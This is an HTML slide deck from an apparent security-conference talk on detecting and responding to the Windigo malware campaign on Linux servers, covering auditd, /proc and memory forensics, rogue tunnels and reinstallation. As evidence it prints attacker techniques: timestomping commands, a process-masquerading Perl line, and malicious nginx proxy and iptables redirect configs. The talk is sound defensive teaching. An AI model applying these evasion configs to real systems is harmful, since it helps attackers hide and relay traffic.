+<div class="ulist step"><ul><li class="fragment"><p>syslog: omits logging</p></li><li class="fragment"><p>package manifests: tampered</p></li><li class="fragment"><p>tcpdump: Ebury stops on <code>IFF_PROMISC</code>, ssh traffic is encrypted</p></li><li class="fragment"><p>core dumping processes and shared memory: long</p></li><li class="fragment"><p>auditd!</p></li></ul></div></section>
+<section id="_auditd"><h2>auditd</h2><div class="paragraph"><p><em>The Linux audit framework provides an auditing system that reliably collects
+information about any security-relevant (or non-security-relevant) event on a
+system.</em></p></div>
+<div class="ulist"><ul><li><p>logging syscalls</p></li><li><p>logs can be sent over the network</p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>auditctl -a exit,always -S execve</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>gather intelligence without tipping off: <code>execve</code> calls</p></li><li><p>remote logs: Making tampering a lot harder</p></li><li><p>now their recon script checks if auditd is activated</p></li><li><p>very verbose</p></li></ul></div></aside></section>
+<section id="_auditd_logs"><h2>auditd logs</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>type=EXECVE msg=audit(1373838239.340:4474200): argc=4 a0="rm" a1="-f" a2="-f" a3="/tmp/q"
+type=CWD msg=audit(1373838239.340:4474200):  cwd="/home/tmpp/openssh-5.9p1"
+type=PATH msg=audit(1373838239.340:4474200): item=0 name="/bin/rm"
+\- inode=22282288 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00
+type=PATH msg=audit(1373838239.340:4474200): item=1 name=(null) inode=4456796
+\- dev=08:01 mode=0100755 ouid=0 ogid=0 rdev =00:00
+type=SYSCALL msg=audit(1373838239.341:4474201): arch=c000003e syscall=59
+\- success=yes exit=0 a0=1f29d40 a1=1eec5f0 a2=1f 03ec0 a3=7fffd6be9a60
+\- items=2 ppid=13403 pid=21287 auid=501 uid=0 gid=0 euid=0
+\- suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty =pts0 ses=128232 comm="touch" exe="/bin/touch" key=(null)
+type=EXECVE msg=audit(1373838239.341:4474201): argc=4 a0="touch" a1="-r"
+\- a2="/etc/ssh/sshd_config" a3="/etc/ssh/ssh_config"</code></pre></div></div></section>
+<section id="_auditd_logs_cont"><h2>auditd logs (cont.)</h2><h3>On non-ascii arguments it switches to hex</h3><div class="listingblock"><div class="content"><pre class="highlight"><code>type=EXECVE msg=audit(1373837952.278:4473290): argc=26 a0="gcc" a1="-g"
+a2="-O2" a3="-Wall" a4="-Wpointer-arith" a5="-Wuninitialized"
+a6="-Wsign-compare" a7="-Wformat-security" a8="-Wno-pointer-sign"
+a9="-Wno-unused-result" a10="-fno-strict-aliasing" a11="-fno-builtin-memset"
+a12="-fstack-protector-all" a13="-I." a14="-I."
+a15=2D445353484449523D222F6574632F73736822 a16=2D445F504154485F5353485F50
+524F4752414D3D222F7573722F6C6F63616C2F62696E2F73736822
+[...]
+a21=2D445F504154485F5353485F5049444449523D222F7661722F72756E22
+a22=2D445F504154485F505249565345505F4348524F4F545F4449523D222F7661722F656D70747922
+a23="-DHAVE_CONFIG_H" a24="-c" a25="rsa.c"
+
+$ ipython
+in [1]: ('2D445F504154485F5353485F504B435331315F48454C504552'
+        '3D222F7573722F6C6F63616C2F6C6962657865632F7373682D'
+        '706B637331312D68656C70657222').decode('hex')
+Out[2]: '-D_PATH_SSH_PKCS11_HELPER="/usr/local/libexec/ssh-pkcs11-helper"'</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>nice if the bad guy are greping files</p></li><li><p>harder to grep for interesting stuff</p></li><li><p>findings:</p><div class="ulist"><ul><li><p>recon and deployment is complex, lots of <code>execve</code> calls</p></li><li><p>sshd forked Perl not bash</p></li><li><p>we also intercepted accept calls to get the source address of ssh backdoor
+connection</p></li></ul></div></li></ul></div></aside></section>
+<section id="_process_analysis"><h2>Process analysis</h2><h3>Once you&#8217;ve found an interesting process</h3><div class="ulist"><ul><li><p>Dump process memory</p><div class="listingblock oversize2"><div class="content"><pre class="highlight"><code>gcore pid</code></pre></div></div></li><li><p><code>strings</code>, <code>gdb</code>, IDA Pro</p></li></ul></div>
+<aside class="notes"><div class="ulist"><div class="title">interesting could be</div><ul><li><p>lots of ongoing network transactions (via netstat)</p></li><li><p>deleted from filesystem but running</p></li></ul></div>
+<div class="ulist"><div class="title">findings</div><ul><li><p>extract configuration from memory</p></li></ul></div></aside></section>
+<section id="_did_you_know"><h2>Did you know?</h2><div class="paragraph"><p><code>proc</code> allows you to extract deleted executables</p></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code># normal
+$ sudo ls -l /proc/17902/exe
+lrwxrwxrwx 1 root root 0 Sep 26 13:11 /proc/17902/exe -&gt; \
+\- /home/olivier/src/nginx-1.5.3/nginx
+$ sha1sum /home/olivier/src/nginx-1.5.3/nginx
+fbb493f83e67a651ccbbf73a5ad22ca6719c19e4  /home/olivier/src/nginx-1.5.3/nginx
+
+$ sudo rm /home/olivier/src/nginx-1.5.3/nginx
+
+# removed
+$ sudo ls -l /proc/17902/exe
+lrwxrwxrwx 1 root root 0 Sep 26 13:11 /proc/17902/exe -&gt; \
+\- /home/olivier/src/nginx-1.5.3/nginx (deleted)
+
+$ sudo cp /proc/17902/exe ./nginx
+$ sha1sum nginx
+fbb493f83e67a651ccbbf73a5ad22ca6719c19e4  nginx</code></pre></div></div>
+<aside class="notes"><div class="ulist"><div class="title">findings</div><ul><li><p>extracted nginx binary</p></li><li><p>extracted config from memory</p></li><li><p>restarted nginx with weakened SSL cipher suite in order to mitm</p></li></ul></div></aside></section>
+<section id="_more_code_proc_code_tricks"><h2>More <code>/proc</code> tricks</h2><div class="ulist"><ul><li><p>We&#8217;ve seen Perl/Calfbot hide as <code>crond</code> in <code>ps -ef</code> output</p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code class="perl language-perl">$0 = "crond";</code></pre></div></div>
+<div class="ulist"><ul><li><p><code>procfs</code> allows to inspect for that</p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code class="bash language-bash"># clean
+$ pgrep -x "cron" | sudo xargs -I '{}' ls -la "/proc/{}/exe"
+lrwxrwxrwx 1 root root 0 Sep 25 13:35 /proc/1389/exe -&gt; /usr/sbin/cron
+
+# suspicious
+$ pgrep -x "cron" | sudo xargs -I '{}' ls -la "/proc/{}/exe"
+lrwxrwxrwx 1 root root 0 Sep 25 13:21 /proc/666/exe -&gt; /usr/bin/perl</code></pre></div></div></section>
+<section id="_caution_2" data-background="#125F79"><h2>Caution</h2><div class="paragraph"><p>Always copy everything from <code>/proc/$pid</code> before killing a process</p></div>
+<aside class="notes"><div class="paragraph"><p>unrelated to windigo but we&#8217;ve seen encrypted scripts where the key was in an
+environment variable unpacking itself (w/o it we couldn&#8217;t do anything even w/
+the script)</p></div></aside></section>
+<section id="_process_analysis_tools"><h2>Process analysis tools</h2><div class="ulist"><ul><li><p><code>lsof -p pid</code></p><div class="ulist"><ul><li><p>to list all files used by process</p></li></ul></div></li><li><p><code>netstat -anp | grep pid</code></p><div class="ulist"><ul><li><p>to list sockets</p></li></ul></div></li><li><p><code>ipcs</code></p><div class="ulist"><ul><li><p>shared memory analysis (later)</p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>you already know about these so we won&#8217;t give more details</p></div></aside></section>
+<section id="_tools_cont"><h2>Tools (cont.)</h2><div class="ulist"><ul><li><p><code>strace</code></p><div class="ulist"><ul><li><p>trace system calls</p></li></ul></div></li><li><p><code>ltrace</code></p><div class="ulist"><ul><li><p>trace library calls</p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>you already know about these so we won&#8217;t give more details</p></div></aside></section>
+<section id="_shared_memory_analysis"><h2>Shared Memory Analysis</h2><h3><code>shm</code>: POSIX Shared Memory (an IPC mechanism)</h3><div class="ulist"><ul><li><p><code>ipcs</code></p></li><li><p><code>shmcat</code>, <a href="http://sourceforge.net/projects/shmcat/" class="bare">http://sourceforge.net/projects/shmcat/</a></p></li></ul></div></section>
+<section id="_dump_shared_segment"><h2>Dump Shared Segment</h2><div class="listingblock"><div class="content"><pre class="highlight"><code class="bash language-bash"># ipcs -m
+------ Shared Memory Segments --------
+key        shmid      owner     perms      bytes     nattch
+[...]
+0x000010e0 465272836  root      600        3282312    0
+
+# ipcs -m -p
+------ Shared Memory Creator/Last-op PIDs --------
+shmid      owner      cpid       lpid
+[...]
+465272836  root       15029      17377
+
+# ps aux | grep 15029
+[...]
+root     15029  0.0  0.0  66300  1204 ?        Ss   Jan26   0:00 /usr/sbin/sshd
+
+# shmcat -m 465272836 &gt; shm_dump</code></pre></div></div>
+<aside class="notes"><div class="paragraph"><p>Anything created or used by <code>sshd</code> is suspicious.
+OpenSSH doesn&#8217;t do such a thing.</p></div>
+<div class="ulist"><div class="title">findings</div><ul><li><p>Cdorked configs</p></li><li><p>OpenSSH leaked passwords</p></li><li><p>XOR encrypted structs with a multi-byte key generated per install</p></li></ul></div></aside></section>
+<section id="_reverse_engineering_perl"><h2>Reverse-engineering Perl</h2><div class="ulist"><ul><li><p>Use <code>perltidy</code> to prettify Perl</p></li><li><p>Rename variables</p><div class="ulist"><ul><li><p>vim: * then <code>cim</code> then (<code>n</code> then <code>.</code>).repeat()</p></li><li><p>or your search/replace of <code>$EDITOR</code></p></li></ul></div></li><li><p>For packed scripts use <code>B::Deparse</code></p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>B::Deparse does impressive stuff on heavily obfuscated perl code</p></li><li><p>but afterwards, its still Perl :P</p></li></ul></div></aside></section>
+<section id="_network_evasion"><h2>Network evasion</h2><div class="ulist"><ul><li><p>SSH tunnels</p></li><li><p>nginx reverse proxies</p></li><li><p>IP in IP tunnels</p></li><li><p>3Proxy</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>Here are the various types of network evasion used by the operators and we
+will cover how to detect each of them</p></div></aside></section>
+<section id="_ssh_tunnels"><h2>SSH tunnels</h2><div class="ulist"><ul><li><p>Through infected servers</p></li><li><p>Used to send spam</p></li></ul></div>
+<div class="paragraph"><p><span class="image"><img src="images/ssh_tunnel_spam.png" alt="ssh_tunnel_spam" width="120%" /></span></p></div>
+<aside class="notes"><div class="ulist"><ul><li><p>high # of IPs to avoid blacklisting</p></li><li><p>Usual reason why people know they are infected and want to do something about
+it. via spamhaus blocking</p></li><li><p>We think its used by the Glupteba infected hosts</p></li></ul></div></aside></section>
+<section id="_finding_ssh_tunnels"><h2>Finding SSH tunnels</h2><div class="ulist"><ul><li><p>Look through listings for <code>sshd</code> process</p><div class="listingblock oversize2"><div class="content"><pre class="highlight"><code>lsof -i -n</code></pre></div></div></li><li><p>Look through listings for <code>sshd</code> process</p><div class="listingblock oversize2"><div class="content"><pre class="highlight"><code>ps -ef</code></pre></div></div></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>one can use <code>netstat -anp</code> instead of <code>lsof -i -n</code></p></li><li><p>or whatever your favorite flags of ps</p></li></ul></div></aside></section>
+<section id="_nginx_reverse_proxies"><h2>nginx reverse proxies</h2><div class="ulist"><ul><li><p>Through infected servers</p></li><li><p>Layers of redirection in front of the Calfbot C&amp;C</p></li><li><p>Layers of redirection in front of the Exploit Kit hosting</p></li><li><p>Binary often in odd location (<code>/boot/sbin/nginx</code>)</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>Not that stealthy I must admit</p></div></aside></section>
+<section id="_nginx_cdorked_config_example"><h2>nginx Cdorked config example</h2><div class="listingblock"><div class="content"><pre class="highlight"><code class="nginxconf language-nginxconf"># ...
+upstream backend_servers {
+    server xx.xxx.118.201:xx05  max_fails=1 fail_timeout=600s weight=25
+    # [... other servers ...]
+}
+
+server {
+    listen 80
+    access_log /dev/null
+
+    location / {
+        proxy_pass http://backend_servers
+        proxy_set_header Host $http_host
+        proxy_redirect off
+        proxy_set_header X-Real-IP $remote_addr
+        proxy_set_header X_Forwarded-For $proxy_add_x_forwarded_for ; X_For.. is not a typo
+        # [... performance things ...]
+    }
+}</code></pre></div></div></section>
+<section id="_nginx_calfbot_config_example"><h2>nginx Calfbot config example</h2><div class="listingblock"><div class="content"><pre class="highlight"><code class="nginxconf language-nginxconf"># ...
+upstream backend_servers {
+    server xxx.x.36.17:4xx35;
+}
+# ...
+server {
+    listen			19xx;
+    listen			443;
+
+    ssl 			on;
+    ssl_certificate		/boot/conf/certificate.pem;
+    ssl_certificate_key	/boot/conf/secret_key.key;
+    # ...
+}</code></pre></div></div></section>
+<section id="_finding_rogue_nginx_reverse_proxy"><h2>Finding rogue nginx reverse proxy</h2><div class="listingblock oversize3"><div class="content"><pre class="highlight"><code># process
+ps -ef | grep nginx
+
+# sockets
+lsof -i -n | grep nginx</code></pre></div></div>
+<aside class="notes"><div class="paragraph"><p>They are really obvious to spot honestly. Dozens of opened sockets.</p></div></aside></section>
+<section id="_ip_in_ip_tunnels"><h2>IP in IP tunnels</h2><div class="ulist"><ul><li><p>Through infected servers</p></li><li><p>Used to hide all sort of traffic (SSH, FTP, browser, etc.)</p></li><li><p>Layers of tunneling found</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>mostly do Internet scanning and bruteforcing (easier to do than w/ ssh
+tunnels)</p></div></aside></section>
+<section id="_but_what_are_ip_in_ip_tunnels"><h2>But what are IP in IP tunnels?</h2><div class="ulist"><ul><li><p>Handled by the kernel</p></li><li><p>Created with <code>ifconfig</code> or <code>iproute2</code> suite</p></li><li><p>Point-to-point link that encapsulate IP inside IP</p></li><li><p>Transport independant</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Most of you probably already know this</p></li><li><p>They are more flexible than reverse proxy / SSH tunnels</p></li></ul></div></aside></section>
+<section id="_finding_ip_in_ip_tunnels"><h2>Finding IP in IP tunnels</h2><div class="ulist"><ul><li><p><code>ifconfig</code> and look for: <code>Link encap:IPIP Tunnel</code></p></li><li><p><code>ip tunnel show</code></p><div class="listingblock"><div class="content"><pre class="highlight"><code class="nohighlight language-nohighlight">tunl0: ip/ip  remote any  local any  ttl inherit  nopmtudisc
+tun10: ip/ip  remote xx.xx.201.34  local xxx.xxx.232.18  dev eth0  ttl inherit
+sit0: ipv6/ip  remote any  local any  ttl 64  nopmtudisc</code></pre></div></div></li><li><p><code>ip route show</code></p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>10.12.12.0/30 dev tun10  proto kernel  scope link  src 10.12.12.2</code></pre></div></div>
+<div class="ulist"><ul><li><p><code>iptables -t nat -L -nv</code></p><div class="ulist"><ul><li><p>post-routing source NAT to map tunnel traffic to <code>eth0</code> IP</p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>Sneakier but only because we are not used to look there</p></div></aside></section>
+<section id="_iptables"><h2>iptables</h2><div class="ulist"><ul><li><p>Rules in the NAT table to bounce traffic of compromised servers</p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>-A PREROUTING -d xx.xx.51.14/32 -p udp -m udp --dport 53 -j DNAT --to-destination xxx.xx.225.200:53
+-A POSTROUTING -d xxx.xx.225.200/32 -p udp -m udp --dport 53 -j SNAT --to-source xx.xx.51.14</code></pre></div></div>
+<aside class="notes"><div class="paragraph"><p>Sometimes rules aren&#8217;t persistent</p></div></aside></section>
+<section id="_finding_iptables_redirects"><h2>Finding iptables redirects</h2><h3>Audit your iptables NAT table rules</h3><div class="listingblock oversize3"><div class="content"><pre class="highlight"><code>iptables -t nat -L -nv</code></pre></div></div></section>
+<section id="_3proxy"><h2>3Proxy</h2><div class="ulist"><ul><li><p>Tiny free cross-platform multi-protocol proxy server</p></li><li><p>Not malware (strings not obfuscated)</p></li><li><p>Sometimes hidden as <code>crond</code></p></li><li><p>Configuration built-in binary</p></li></ul></div></section>
+<section id="_finding_3proxy"><h2>Finding 3Proxy</h2><div class="olist arabic"><ol class="arabic"><li><p><code>lsof -i -n</code></p></li><li><p><code>/proc</code> to find binary</p></li><li><p><code>strings</code></p></li></ol></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>$ strings crond | grep 3proxy
+Documentation and sources: http://www.security.nnov.ru/soft/3proxy/
+3proxy@</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>find proxied traffic through network</p></li><li><p>find binary through /proc</p></li><li><p>check binary</p></li></ul></div></aside></section>
+<section id="_out_of_band_forensics"><h2>Out of band Forensics</h2><div class="ulist"><ul><li><p>Network captures</p></li><li><p>Copy disk content</p></li><li><p>Dump memory</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>the one way which the operator can&#8217;t tamper with</p></div></aside></section>
+<section id="_network_captures"><h2>Network captures</h2><div class="ulist"><ul><li><p>full packet capture from an external host</p><div class="ulist"><ul><li><p>wireshark, dumpcap, security-onion distro</p></li></ul></div></li><li><p>SSH mitm, <a href="http://www.signedness.org/tools/" class="bare">http://www.signedness.org/tools/</a></p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>full packet from the host doesn&#8217;t work</p></li><li><p>mitm-ssh worked well for us</p></li></ul></div></aside></section>
+<section id="_disk_capture"><h2>Disk capture</h2><div class="ulist"><ul><li><p><code>dd</code></p></li><li><p>Or ask your hosting provider</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>or any of the usual stuff</p></div></aside></section>
+<section id="_dumping_memory"><h2>Dumping memory</h2><div class="ulist"><ul><li><p>in-band: LiME, <a href="https://github.com/504ensicsLabs/LiME" class="bare">https://github.com/504ensicsLabs/LiME</a></p></li><li><p>out-of-band: through virtualization snapshots</p></li></ul></div></section>
+<section id="_memory_analysis"><h2>Memory analysis</h2><div class="ulist"><ul><li><p>Volatility, <a href="https://github.com/volatilityfoundation/volatility" class="bare">https://github.com/volatilityfoundation/volatility</a></p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>and the GREAT book: The Art of Memory Forensic</p></li><li><p>in honesty we worked mostly from the servers themselves</p><div class="ulist"><ul><li><p>it was easier that way</p></li><li><p>we knew the malware wasn&#8217;t altering the kernel</p></li></ul></div></li></ul></div></aside></section>
+<section id="_indicators_of_compromise"><h2>Indicators of Compromise</h2><h3>We released so-called IOCs</h3><div class="ulist"><ul><li><p><a href="https://github.com/eset/malware-ioc/tree/master/windigo" class="bare">https://github.com/eset/malware-ioc/tree/master/windigo</a></p></li><li><p><a href="https://www.cert-bund.de/ebury-faq" class="bare">https://www.cert-bund.de/ebury-faq</a></p></li><li><p>[BEST] Contact us: <a href="mailto:windigo@eset.sk">windigo@eset.sk</a></p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>We stopped updating them because they were worked-around quickly after we
+updated them</p></div>
+<div class="paragraph"><p>With all these techniques, it&#8217;s not hard to understand why seizing servers
+and analysing disks will not suffice.</p></div></aside></section>
+<section id="_reaction_example"><h2>Reaction example</h2><div class="paragraph"><p><span class="image"><img src="images/good_job_eset.png" alt="good_job_eset" /></span></p></div>
+<div class="paragraph"><p><span class="image"><img src="images/good_job_eset_cropped.png" alt="good_job_eset_cropped" /></span></p></div>
+<aside class="notes"><div class="paragraph"><p>One example where they react to our research. Ebury update</p></div></aside></section>
+<section id="_incident_response"><h2>Incident response</h2><div class="ulist step"><ul><li class="fragment"><p>Don&#8217;t be in denial</p></li><li class="fragment"><p>Gather all the evidence you can and keep it</p><div class="ulist"><ul><li><p>[BEST] disk image, memory dump, external packet capture</p></li><li><p>binaries, <code>/proc</code> metadata</p></li></ul></div></li><li class="fragment"><p>Reinstall from scratch</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>remember: they are root</p></div></aside></section>
+<section id="_reinstall"><h2>Reinstall</h2><div class="ulist"><ul><li><p>Assume <strong>user and admin</strong> credentials and keys <strong>compromised</strong></p></li><li><p>Reinstall from trusted sources</p></li><li><p>Be careful when restoring backups</p></li><li><p>Do not reinstall from a compromised SSH gateway</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>keys stored on servers that is</p></li><li><p>and the hardest part is probably forcing users in not setting back their old
+passwords&#8230;&#8203;</p></li></ul></div></aside></section>
+<section id="_post_incident_response"><h2>Post incident response</h2><div class="ulist"><ul><li><p>Consider implementing a password policy</p><div class="ulist"><ul><li><p>pam-cracklib, Openwall&#8217;s pam_passwdqc</p></li></ul></div></li><li><p>No more passwords, use keys</p></li><li><p>Don&#8217;t store keys on server ever: <code>ssh-agent</code></p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>but be aware of ssh-agent&#8217;s limitations</p></li></ul></div></aside></section>
+<section id="_post_incident_response_cont"><h2>Post incident response (cont.)</h2><h3>[BEST] use two-factor authentication</h3><div class="ulist"><ul><li><p>google-authenticator or oath-toolkit PAM module</p></li><li><p>FreeIPA</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>Go see talk about FreeIPA by Fraser Tweedale in case room 3 right after my
+talk</p></div></aside></section>
+<section id="_forensics_incident_response_and_mitigation" data-background="#797620"><h2>Forensics, Incident Response and Mitigation</h2><div class="ulist"><ul><li><p>Out of band is better but in-band worked</p></li><li><p>Full reinstall seems hard</p></li><li><p>One can avoid all this with simple measures</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>for us</p></li><li><p>we saw so many people getting reinfected</p></li><li><p>ssh keys stored locally and/or 2FA</p></li></ul></div></aside></section>
+<section id="_plea_to_system_developers"><h2>Plea to System Developers</h2><div class="ulist"><ul><li><p>Logs should be harder to tamper</p><div class="ulist"><ul><li><p>journald&#8217;s Forward Secure Sealing</p></li></ul></div></li><li><p>Same for package manifests</p></li><li><p>Easy way to verify package integrity from LiveCD</p></li><li><p>yum: listing GPG key-signer should be builtin</p><div class="ulist"><ul><li><p><a href="https://fedorahosted.org/keychecker/" class="bare">https://fedorahosted.org/keychecker/</a></p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>systemd</p></li></ul></div></aside></section>
+<section id="_closing_words" data-background="#797620"><h2>Closing words</h2><h3>You can help fight this threat!</h3><div class="ulist"><ul><li><p>Spread the word on detection and prevention techniques</p></li><li><p>Help cleaning infected systems</p></li><li><p>Work on making the ecosystem more resistant</p></li><li><p>Send us anything suspect you find!</p><div class="paragraph"><p><a href="mailto:windigo@eset.sk">windigo@eset.sk</a></p></div></li></ul></div></section>
+<section id="__logout"><h2>:~$ logout</h2><h3>Thanks!</h3><div class="ulist"><ul><li><p>Questions?</p></li><li><p><a href="http://twitter.com/obilodeau">@obilodeau</a></p></li><li><p><a href="mailto:windigo@eset.sk">windigo@eset.sk</a></p></li></ul></div></section></div></div><script src="reveal.js/lib/js/head.min.js"></script><script src="reveal.js/js/reveal.min.js"></script><script type="text/javascript">// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+ Reveal.initialize({
+
+   // Display controls in the bottom right corner
+   controls: false,
+
+   // Display a presentation progress bar
+   progress: true,
+
+   // Display the page number of the current slide
+   slideNumber: false,
+
+   // Push each slide change to the browser history
+   history: true,
+
+   // Enable keyboard shortcuts for navigation
+   keyboard: true,
+
+   // Enable the slide overview mode
+   overview: true,
+
+   // Vertical centering of slides
+   center: true,
+
+   // Enables touch navigation on devices with touch input
+   touch: true,
+
+   // Loop the presentation
+   loop: false,
+
+   // Change the presentation direction to be RTL
+   rtl: false,
+
+   // Turns fragments on and off globally
+   fragments: true,
+
+   // Flags if the presentation is running in an embedded mode,
+   // i.e. contained within a limited portion of the screen
+   embedded: false,
+
+   // Number of milliseconds between automatically proceeding to the
+   // next slide, disabled when set to 0, this value can be overwritten
+   // by using a data-autoslide attribute on your slides
+   autoSlide: 0,
+
+   // Stop auto-sliding after user input
+   autoSlideStoppable: true,
+
+   // Enable slide navigation via mouse wheel
+   mouseWheel: false,
+
+   // Hides the address bar on mobile devices
+   hideAddressBar: true,
+
+   // Opens links in an iframe preview overlay
+   previewLinks: false,
+
+   // Transition style
+   transition: 'none', // default/cube/page/concave/zoom/linear/fade/none
+
+   // Transition speed
+   transitionSpeed: 'default', // default/fast/slow
+
+   // Transition style for full page slide backgrounds
+   backgroundTransition: 'slide', // default/none/slide/concave/convex/zoom
+
+   // Number of slides away from the current that are visible
+   viewDistance: 3,
+
+   // Parallax background image
+   parallaxBackgroundImage: '', // e.g. "'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg'"
+
+   // Parallax background size
+   parallaxBackgroundSize: '', // CSS syntax, e.g. "2100px 900px"
+
+   // Optional libraries used to extend on reveal.js
+   dependencies: [
+       { src: 'reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+       { src: 'reveal.js/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+       { src: 'reveal.js/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+       { src: 'reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+       { src: 'reveal.js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+       { src: 'reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+   ]
+ });</script></body></html>
